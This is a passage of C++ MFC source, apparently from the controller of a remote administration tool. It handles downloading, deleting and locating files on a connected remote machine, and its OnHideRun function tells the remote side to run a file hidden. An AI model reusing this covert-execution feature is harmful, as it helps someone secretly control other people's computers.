	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("下载(附带目录)"));
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除"));
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("打开文件位置"));
	POINT mousepos;
	GetCursorPos(&mousepos);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&mListmeau, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepos.x, mousepos.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 100:
	{
		m_bIsUpload = false;
		EnableControl(FALSE);
		//if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		//	m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
		// 重置下载任务列表
		CString	file;
		m_Remote_Download_Job.RemoveAll();
		POSITION pos = m_list_remote_search.GetFirstSelectedItemPosition();
		CString m_Search_Path;
		while (pos)
		{
			int nItem = m_list_remote_search.GetNextSelectedItem(pos);
			m_Search_Path = m_list_remote_search.GetItemText(nItem, 3);
			m_Search_Path += '\\';
			file = m_Search_Path + m_list_remote_search.GetItemText(nItem, 0);
			if (m_list_remote_search.GetItemData(nItem))
				file += '\\';
			m_Remote_Download_Job.AddTail(file);
		}
		if (file.IsEmpty())
		{
			EnableControl(TRUE);
			::MessageBox(m_hWnd, _T("请选择文件！"), _T("警告"), MB_OK | MB_ICONWARNING);
			return;
		}
		strLpath = GetDirectoryPath(FALSE);
		if (strLpath == _T(""))
		{
			EnableControl(TRUE);
			return;
		}
		if (strLpath.GetAt(strLpath.GetLength() - 1) != _T('\\'))
			strLpath += _T("\\");
		m_nTransferMode = TRANSFER_MODE_NORMAL;
		SendDownloadJob();
	}	break;
	case 200:
	{
		m_bIsUpload = false;
		// TODO: Add your command handler code here
		CString str;
		if (m_list_remote_search.GetSelectedCount() > 1)
			str.Format(_T("确定要将这 %d 项删除吗?"), m_list_remote_search.GetSelectedCount());
		else
		{
			CString file = m_list_remote_search.GetItemText(m_list_remote_search.GetSelectionMark(), 0);
			if (m_list_remote_search.GetItemData(m_list_remote_search.GetSelectionMark()) == 1)
				str.Format(_T("确实要删除文件夹“%s”并将所有内容删除吗?"), file);
			else
				str.Format(_T("确实要把“%s”删除吗?"), file);
		}
		if (::MessageBox(m_hWnd, str, _T("确认删除"), MB_YESNO | MB_ICONQUESTION) == IDNO)
			return;
		m_Remote_Delete_Job.RemoveAll();
		POSITION pos = m_list_remote_search.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
		CString m_Search_Path;
		while (pos) //so long as we have a valid POSITION, we keep iterating
		{
			int nItem = m_list_remote_search.GetNextSelectedItem(pos);
			m_Search_Path = m_list_remote_search.GetItemText(nItem, 3);
			m_Search_Path += '\\';
			CString	file = m_Search_Path + m_list_remote_search.GetItemText(nItem, 0);
			// 如果是目录
			if (m_list_remote_search.GetItemData(nItem))
				file += _T('\\');

			m_Remote_Delete_Job.AddTail(file);
		} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

		EnableControl(FALSE);
		// 发送第一个下载任务
		SendDeleteJob();
	}	break;
	case 300:
	{
		int Index = 0;
		Index = m_list_remote_search.GetSelectionMark();
		if (Index == -1)
			return;
		CString str = m_list_remote_search.GetItemText(Index, 3);
		if (Index == -1)
			return;
		m_Remote_Path = "";
		GetRemoteFileList(str);
	}	break;

	default:
		break;
	}
	mListmeau.DestroyMenu();
	*pResult = 0;
}

//隐藏运行n
void CFileManagerDlg::OnHideRun()
{
	// TODO: Add your command handler code here
	CString	str;
	int	nItem = m_list_remote.GetSelectionMark();
	str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
	if (m_list_remote.GetItemData(nItem) == 1)
		str += _T("\\");

	int		nPacketLength = (str.GetLength() + 1) * sizeof(TCHAR) + 1;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	LocalFree(lpPacket);
	
}
